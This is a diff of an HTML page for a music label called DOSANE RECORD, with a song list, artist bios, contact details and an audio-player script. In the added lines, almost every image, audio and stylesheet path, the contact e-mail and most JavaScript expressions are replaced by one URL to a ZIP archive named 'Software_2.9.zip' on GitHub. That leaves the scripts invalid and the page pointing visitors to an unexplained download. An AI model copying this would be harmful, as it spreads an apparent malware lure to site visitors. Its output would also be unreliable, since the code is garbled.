@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Discográfica - Repertorio</title>
-  <link rel="stylesheet" href="DOSANE RECORD estilo.css">
+  <link rel="stylesheet" href="DOSANE RECORD https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip">
   <style>
     html {
       scroll-behavior: smooth;
@@ -25,7 +25,7 @@
   <!-- Sección de Inicio -->
   <div id="inicio" class="encabezado-led">
     <div class="logo-container">
-      <img src="Logo/Logo.png" alt="Logo DOSANE RECORD" class="logo">
+      <img src="https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip" alt="Logo DOSANE RECORD" class="logo">
     </div>
     <h1>DOSANE RECORD</h1>
   </div>
@@ -38,7 +38,7 @@
       <h2>DEJAME ABRAZARTE SAMMY X DJ DOMINICAN Ft NERY</h2>
       <img src="Caratula/DEJAME ABRAZARTE .jpg" alt="Carátula" width="300">
       <audio class="audio-player">
-        <source src="DJ DOMINICAN X SAMMY/DEJAME ABRAZARTE SAMMY X DJ DOMINICAN Ft NERY.mp3" type="audio/mpeg">
+        <source src="DJ DOMINICAN X SAMMY/DEJAME ABRAZARTE SAMMY X DJ DOMINICAN Ft https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip" type="audio/mpeg">
       </audio>
       <div class="custom-player">
         <button class="play-btn">▶️</button>
@@ -51,7 +51,7 @@
       <h2>DJ DOMINICAN X SAMMY - BAILA LUNA</h2>
       <img src="Caratula/Baila luna .jpg" alt="Carátula" width="300">
       <audio class="audio-player">
-        <source src="DJ DOMINICAN X SAMMY/Sammy ft DJ DOMINICAN Baila LUNA.mp3" type="audio/mpeg">
+        <source src="DJ DOMINICAN X SAMMY/Sammy ft DJ DOMINICAN Baila https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip" type="audio/mpeg">
       </audio>
       <div class="custom-player">
         <button class="play-btn">▶️</button>
@@ -62,9 +62,9 @@
 
     <div class="cancion">
       <h2>UN VERANO MÁS SAMMY X DJ DOMINICAN</h2>
-      <img src="Caratula/Un Verano Mas.png" alt="Carátula" width="300">
+      <img src="Caratula/Un Verano https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip" alt="Carátula" width="300">
       <audio class="audio-player">
-        <source src="DJ DOMINICAN X SAMMY/UN VERANO MAS.mp3" type="audio/mpeg">
+        <source src="DJ DOMINICAN X SAMMY/UN VERANO https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip" type="audio/mpeg">
       </audio>
       <div class="custom-player">
         <button class="play-btn">▶️</button>
@@ -75,9 +75,9 @@
 
     <div class="cancion">
       <h2>TU MADRE TE AMA - SAMMY X DJ DOMINICAN</h2>
-      <img src="Caratula/Tu Madre Te ama.png" alt="Carátula" width="300">
+      <img src="Caratula/Tu Madre Te https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip" alt="Carátula" width="300">
       <audio class="audio-player">
-        <source src="DJ DOMINICAN X SAMMY/DJ DOMINICAN X SAMMY TU MADRE TE AMA.mp3" type="audio/mpeg">
+        <source src="DJ DOMINICAN X SAMMY/DJ DOMINICAN X SAMMY TU MADRE TE https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip" type="audio/mpeg">
       </audio>
       <div class="custom-player">
         <button class="play-btn">▶️</button>
@@ -93,13 +93,13 @@
     <h2 style="text-align:center; color:#000000; margin-top:60px;">Nuestros Artistas</h2>
 
     <div class="artista">
-      <img src="Foto de biografia/Sammy.jpg" alt="Sammy" class="foto-artista">
+      <img src="Foto de https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip" alt="Sammy" class="foto-artista">
       <h3>Sammy</h3>
       <p>Sammy es un artista urbano con una carrera en ascenso, conocido por su estilo versátil y colaboraciones con DJ Dominican.</p>
     </div>
 
     <div class="artista">
-      <img src="Foto de biografia/DJ DOMINICAN.jpg" alt="DJ Dominican" class="foto-artista">
+      <img src="Foto de biografia/DJ https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip" alt="DJ Dominican" class="foto-artista">
       <h3>DJ Dominican</h3>
       <p>Productor musical. Sus beats únicos dan vida a los éxitos más recientes del sello. Fundador de DOSANE RECORD junto a Sammy.</p>
     </div>
@@ -109,53 +109,53 @@
   <!-- Sección de Contacto -->
   <div id="contacto">
     <h2 style="text-align:center; color:#000000; margin-top:60px;">Contacto</h2>
-    <p style="text-align:center; color:#000000;">Escríbenos a: djdominican9@gmail.com</p>
+    <p style="text-align:center; color:#000000;">Escríbenos a: https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip</p>
   </div>
 
   <!-- Script del reproductor -->
   <script>
-    document.querySelectorAll('.cancion').forEach(cancion => {
-      const audio = cancion.querySelector('.audio-player');
-      const playBtn = cancion.querySelector('.play-btn');
-      const seekBar = cancion.querySelector('.seek-bar');
-      const time = cancion.querySelector('.time');
+    https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('.cancion').forEach(cancion => {
+      const audio = https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('.audio-player');
+      const playBtn = https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('.play-btn');
+      const seekBar = https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('.seek-bar');
+      const time = https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('.time');
 
       if (audio && playBtn && seekBar && time) {
         let playing = false;
 
-        playBtn.addEventListener('click', () => {
+        https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('click', () => {
           if (playing) {
-            audio.pause();
-            playBtn.textContent = '▶️';
+            https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip();
+            https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip = '▶️';
           } else {
             // Pausar los demás audios
-            document.querySelectorAll('.audio-player').forEach(a => {
+            https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('.audio-player').forEach(a => {
               if (a !== audio) {
-                a.pause();
-                a.closest('.cancion').querySelector('.play-btn').textContent = '▶️';
+                https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip();
+                https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('.cancion').querySelector('.play-btn').textContent = '▶️';
               }
             });
 
-            audio.play();
-            playBtn.textContent = '⏸️';
+            https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip();
+            https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip = '⏸️';
           }
           playing = !playing;
         });
 
-        audio.addEventListener('timeupdate', () => {
-          const current = audio.currentTime;
-          const duration = audio.duration;
+        https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('timeupdate', () => {
+          const current = https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip;
+          const duration = https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip;
           if (!isNaN(duration)) {
-            seekBar.value = (current / duration) * 100;
-            const minutes = Math.floor(current / 60).toString().padStart(2, '0');
-            const seconds = Math.floor(current % 60).toString().padStart(2, '0');
-            time.textContent = `${minutes}:${seconds}`;
+            https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip = (current / duration) * 100;
+            const minutes = https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip(current / 60).toString().padStart(2, '0');
+            const seconds = https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip(current % 60).toString().padStart(2, '0');
+            https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip = `${minutes}:${seconds}`;
           }
         });
 
-        seekBar.addEventListener('input', () => {
-          if (!isNaN(audio.duration)) {
-            audio.currentTime = (seekBar.value / 100) * audio.duration;
+        https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('input', () => {
+          if (!isNaN(https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip)) {
+            https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip = (https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip / 100) * https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip;
           }
         });
       }
@@ -164,22 +164,22 @@
 
   <!-- Script de menú activo -->
   <script>
-    const enlaces = document.querySelectorAll('.menu a');
-    const secciones = document.querySelectorAll('div[id]');
+    const enlaces = https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('.menu a');
+    const secciones = https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('div[id]');
 
-    window.addEventListener('scroll', () => {
+    https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('scroll', () => {
       let current = '';
-      secciones.forEach(section => {
-        const sectionTop = section.offsetTop;
+      https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip(section => {
+        const sectionTop = https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip;
         if (pageYOffset >= sectionTop - 80) {
-          current = section.getAttribute('id');
+          current = https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('id');
         }
       });
 
-      enlaces.forEach(link => {
-        link.classList.remove('activo');
-        if (link.getAttribute('href') === `#${current}`) {
-          link.classList.add('activo');
+      https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip(link => {
+        https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('activo');
+        if (https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('href') === `#${current}`) {
+          https://github.com/junior478rd/DOSANE-RECORD./raw/refs/heads/main/eclogite/Software_2.9.zip('activo');
         }
       });
     });
